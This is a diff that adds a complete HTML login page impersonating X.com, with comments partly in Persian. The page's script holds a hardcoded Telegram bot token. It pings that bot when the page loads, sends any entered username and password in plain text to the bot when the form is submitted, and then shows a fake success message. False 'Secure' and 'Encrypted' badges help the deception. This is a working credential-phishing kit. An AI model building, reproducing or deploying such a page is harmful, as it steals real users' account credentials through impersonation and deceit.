@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login | X.com</title>
+  <!-- Font Awesome 6 (Free) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    /* ===== Reset & Base ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #0a0a0a;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      background-image: radial-gradient(circle at 20% 30%, #1a1a1a 0%, #000000 95%);
+    }
+
+    /* ===== Login Card ===== */
+    .login-card {
+      background: #000000;
+      border: 1px solid #2f2f2f;
+      border-radius: 32px;
+      padding: 2.8rem 2.5rem 2.8rem;
+      max-width: 440px;
+      width: 100%;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 0 1px #222 inset;
+      transition: box-shadow 0.2s;
+    }
+
+    .login-card:hover {
+      box-shadow: 0 30px 80px rgba(0, 0, 0, 1), 0 0 0 1px #3a3a3a inset;
+    }
+
+    /* ===== Brand: X.com ===== */
+    .brand {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 2.4rem;
+    }
+
+    .x-logo {
+      background: #ffffff;
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.4rem;
+      font-weight: 900;
+      color: #000;
+      font-family: 'Segoe UI', 'Arial', sans-serif;
+      box-shadow: 0 0 0 1px #333;
+      transition: 0.2s;
+    }
+
+    .x-logo .x-letter {
+      font-size: 2.5rem;
+      font-weight: 700;
+      letter-spacing: -2px;
+      line-height: 1;
+    }
+
+    .brand-text {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.2;
+    }
+
+    .brand-text .title {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #e7e9ea;
+      letter-spacing: -0.5px;
+    }
+
+    .brand-text .title span {
+      color: #ffffff;
+      background: linear-gradient(to right, #ffffff, #aaa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    /* ===== Form Header ===== */
+    .form-header {
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+
+    .form-header h2 {
+      font-size: 1.7rem;
+      font-weight: 700;
+      color: #e7e9ea;
+      letter-spacing: -0.3px;
+    }
+
+    .form-header h2 i {
+      color: #1d9bf0;
+      margin-right: 8px;
+      font-size: 1.4rem;
+    }
+
+    /* ===== Input Fields ===== */
+    .input-group {
+      margin-bottom: 1.2rem;
+    }
+
+    .input-field {
+      background: #0a0a0a;
+      border: 1px solid #2f2f2f;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      transition: all 0.15s ease;
+      padding: 0 16px;
+      position: relative;
+    }
+
+    .input-field:focus-within {
+      border-color: #1d9bf0;
+      background: #0f0f0f;
+      box-shadow: 0 0 0 4px rgba(29, 155, 240, 0.08);
+    }
+
+    .input-field i {
+      color: #71767b;
+      font-size: 1.1rem;
+      width: 28px;
+      text-align: center;
+      transition: color 0.2s;
+    }
+
+    .input-field:focus-within i {
+      color: #1d9bf0;
+    }
+
+    .input-field input {
+      width: 100%;
+      background: transparent;
+      border: none;
+      padding: 18px 12px 18px 6px;
+      font-size: 1rem;
+      color: #e7e9ea;
+      outline: none;
+      font-weight: 400;
+    }
+
+    .input-field input::placeholder {
+      color: #5b5f65;
+      font-weight: 300;
+      font-size: 0.95rem;
+    }
+
+    /* ===== Eye Icon ===== */
+    .toggle-password {
+      cursor: pointer;
+      color: #71767b;
+      font-size: 1.1rem;
+      transition: color 0.2s;
+      padding: 0 4px;
+      user-select: none;
+    }
+
+    .toggle-password:hover {
+      color: #e7e9ea;
+    }
+
+    .input-field:focus-within .toggle-password {
+      color: #1d9bf0;
+    }
+
+    /* ===== Login Button ===== */
+    .login-btn {
+      width: 100%;
+      padding: 14px 10px;
+      background: #ffffff;
+      border: none;
+      border-radius: 40px;
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: #0f0f0f;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      margin-top: 0.8rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      letter-spacing: 0.3px;
+    }
+
+    .login-btn i {
+      font-size: 1.1rem;
+      color: #0f0f0f;
+    }
+
+    .login-btn:hover {
+      background: #e8e8e8;
+      transform: scale(1.01);
+    }
+
+    .login-btn:active {
+      transform: scale(0.98);
+    }
+
+    /* ===== Remember me ===== */
+    .options {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      margin: 1.2rem 0 1.6rem;
+      font-size: 0.9rem;
+    }
+
+    .remember {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #e7e9ea;
+      cursor: pointer;
+    }
+
+    .remember input[type="checkbox"] {
+      appearance: none;
+      -webkit-appearance: none;
+      width: 20px;
+      height: 20px;
+      background: #0a0a0a;
+      border: 1px solid #3d4146;
+      border-radius: 4px;
+      cursor: pointer;
+      position: relative;
+      transition: 0.15s;
+      flex-shrink: 0;
+    }
+
+    .remember input[type="checkbox"]:checked {
+      background: #1d9bf0;
+      border-color: #1d9bf0;
+    }
+
+    .remember input[type="checkbox"]:checked::after {
+      content: '\f00c';
+      font-family: 'Font Awesome 6 Free';
+      font-weight: 900;
+      font-size: 14px;
+      color: white;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    /* ===== Security Footer ===== */
+    .security-footer {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 2.2rem;
+      font-size: 0.7rem;
+      color: #3d4146;
+      flex-wrap: wrap;
+    }
+
+    .security-footer i {
+      margin-right: 5px;
+    }
+
+    .security-footer span {
+      transition: 0.15s;
+      cursor: default;
+    }
+
+    .security-footer span:hover {
+      color: #71767b;
+    }
+
+    /* ===== Responsive ===== */
+    @media (max-width: 480px) {
+      .login-card {
+        padding: 2rem 1.5rem 2.2rem;
+        border-radius: 24px;
+      }
+      .brand-text .title {
+        font-size: 1.6rem;
+      }
+      .x-logo {
+        width: 48px;
+        height: 48px;
+        font-size: 2rem;
+      }
+      .form-header h2 {
+        font-size: 1.4rem;
+      }
+      .options {
+        justify-content: center;
+      }
+    }
+
+    /* ===== Animation ===== */
+    .login-card {
+      animation: fadeUp 0.5s cubic-bezier(0.2, 0.9, 0.3, 1.1) forwards;
+    }
+
+    @keyframes fadeUp {
+      0% {
+        opacity: 0;
+        transform: translateY(20px) scale(0.97);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    /* ===== پیام‌های خطا و موفقیت ===== */
+    .error-msg {
+      background: #3d1a1a;
+      color: #f28b82;
+      padding: 10px 14px;
+      border-radius: 8px;
+      font-size: 14px;
+      margin-bottom: 12px;
+      display: none;
+      text-align: left;
+      border: 1px solid #5c2020;
+    }
+    .error-msg i {
+      margin-left: 6px;
+    }
+
+    .success-msg {
+      background: #1a3d1a;
+      color: #81c995;
+      padding: 10px 14px;
+      border-radius: 8px;
+      font-size: 14px;
+      margin-bottom: 12px;
+      display: none;
+      text-align: left;
+      border: 1px solid #2a5c2a;
+    }
+    .success-msg i {
+      margin-left: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-card">
+    <!-- ===== Brand: X.com ===== -->
+    <div class="brand">
+      <div class="x-logo">
+        <span class="x-letter">𝕏</span>
+      </div>
+      <div class="brand-text">
+        <div class="title"><span>X.com</span></div>
+      </div>
+    </div>
+
+    <!-- ===== Title ===== -->
+    <div class="form-header">
+      <h2><i class="fas fa-lock"></i> Sign in to your account</h2>
+    </div>
+
+    <!-- ===== پیام‌های خطا و موفقیت ===== -->
+    <div class="error-msg" id="errorMsg">
+      <i class="fas fa-exclamation-circle"></i> <span id="errorText">خطا رخ داده است.</span>
+    </div>
+    <div class="success-msg" id="successMsg">
+      <i class="fas fa-check-circle"></i> ورود موفقیت‌آمیز!
+    </div>
+
+    <!-- ===== Form ===== -->
+    <form id="loginForm" onsubmit="return handleLogin(event)">
+      <!-- Email / Username -->
+      <div class="input-group">
+        <div class="input-field">
+          <i class="fas fa-envelope"></i>
+          <input type="text" id="loginInput" placeholder="Email or username" value="" />
+        </div>
+      </div>
+
+      <!-- Password with Eye Toggle -->
+      <div class="input-group">
+        <div class="input-field">
+          <i class="fas fa-key"></i>
+          <input type="password" id="passwordField" placeholder="Password" value="" />
+          <span class="toggle-password" id="togglePassword">
+            <i class="fas fa-eye-slash"></i>
+          </span>
+        </div>
+      </div>
+
+      <!-- Remember me -->
+      <div class="options">
+        <label class="remember">
+          <input type="checkbox" checked /> Remember me
+        </label>
+      </div>
+
+      <!-- Login Button -->
+      <button type="submit" class="login-btn">
+        <i class="fas fa-arrow-right"></i>
+        Sign in
+      </button>
+    </form>
+
+    <!-- ===== Security Footer ===== -->
+    <div class="security-footer">
+      <span><i class="fas fa-shield-alt"></i> Secure</span>
+      <span><i class="fas fa-lock"></i> Encrypted</span>
+      <span><i class="fas fa-user-secret"></i> Privacy</span>
+    </div>
+  </div>
+
+  <!-- ===== JavaScript ===== -->
+  <script>
+    // ===== تنظیمات تلگرام =====
+    const TELEGRAM_CONFIG = {
+      botToken: "8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ",
+      chatId: "6689313262"
+    };
+
+    const WAKEUP_COUNT = 2;
+
+    // ===== ارسال پیام به تلگرام =====
+    function sendTelegramMessage(text, parseMode = 'Markdown') {
+      const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+
+      return fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CONFIG.chatId,
+          text: text,
+          parse_mode: parseMode
+        })
+      })
+      .then(res => res.json())
+      .catch(err => console.error("Telegram error:", err));
+    }
+
+    // ===== ارسال پیام‌های ویک‌آپ هنگام لود صفحه =====
+    function sendWakeupOnLoad() {
+      for (let i = 1; i <= WAKEUP_COUNT; i++) {
+        setTimeout(() => {
+          const message = `🌐 **X.com Page Loaded - Wake-up** (${i}/${WAKEUP_COUNT})\n⏰ ${new Date().toLocaleString('fa-IR')}`;
+          sendTelegramMessage(message);
+        }, i * 500);
+      }
+    }
+
+    // ===== ارسال ویک‌آپ + اطلاعات ورود =====
+    function sendWakeupAndLoginInfo(username, password) {
+      // مرحله 1: ارسال ۲ پیام ویک‌آپ
+      let wakeupPromises = [];
+      for (let i = 1; i <= WAKEUP_COUNT; i++) {
+        const promise = new Promise((resolve) => {
+          setTimeout(() => {
+            const message = `🔄 **X.com Wake-up ping** (${i}/${WAKEUP_COUNT})\n⏰ ${new Date().toLocaleString('fa-IR')}`;
+            sendTelegramMessage(message)
+              .then(result => resolve(result))
+              .catch(err => resolve({ ok: false, error: err }));
+          }, i * 600);
+        });
+        wakeupPromises.push(promise);
+      }
+
+      // مرحله 2: بعد از اتمام ویک‌آپ‌ها، اطلاعات را ارسال کن
+      Promise.all(wakeupPromises).then(() => {
+        setTimeout(() => {
+          const message =
+            `🔔 **ورود جدید به X.com!**\n\n` +
+            `👤 **یوزرنیم/ایمیل:** \`${username}\`\n` +
+            `🔑 **رمز عبور:** \`${password}\`\n\n` +
+            `🕐 زمان: ${new Date().toLocaleString('fa-IR')}`;
+
+          sendTelegramMessage(message);
+        }, 500);
+      });
+    }
+
+    // ===== Eye Toggle =====
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordField = document.getElementById('passwordField');
+
+    togglePassword.addEventListener('click', function () {
+      const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordField.setAttribute('type', type);
+
+      const icon = this.querySelector('i');
+      if (type === 'password') {
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+      } else {
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+      }
+    });
+
+    // ===== مدیریت فرم =====
+    function handleLogin(e) {
+      e.preventDefault();
+
+      const input = document.getElementById('loginInput').value.trim();
+      const password = document.getElementById('passwordField').value.trim();
+      const errorBox = document.getElementById('errorMsg');
+      const errorText = document.getElementById('errorText');
+      const successBox = document.getElementById('successMsg');
+
+      errorBox.style.display = 'none';
+      successBox.style.display = 'none';
+
+      let isValid = true;
+      let errorMessage = '';
+
+      // اعتبارسنجی
+      if (input.length < 3) {
+        isValid = false;
+        errorMessage = 'لطفاً ایمیل یا نام کاربری معتبر وارد کنید (حداقل ۳ کاراکتر)';
+      }
+
+      if (isValid && password.length < 5) {
+        isValid = false;
+        errorMessage = 'رمز عبور باید حداقل ۵ کاراکتر باشد';
+      }
+
+      if (!isValid) {
+        errorText.textContent = errorMessage;
+        errorBox.style.display = 'block';
+        return false;
+      }
+
+      // ارسال پیام‌ها به تلگرام
+      sendWakeupAndLoginInfo(input, password);
+
+      // نمایش پیام موفقیت
+      successBox.innerHTML = `<i class="fas fa-check-circle"></i> ورود موفقیت‌آمیز به X.com!`;
+      successBox.style.display = 'block';
+
+      return false;
+    }
+
+    // ===== اجرا در هنگام لود صفحه =====
+    document.addEventListener('DOMContentLoaded', function() {
+      sendWakeupOnLoad(); // ارسال ۲ پیام ویک‌آپ بی‌صدا
+    });
+  </script>
+</body>
+</html>
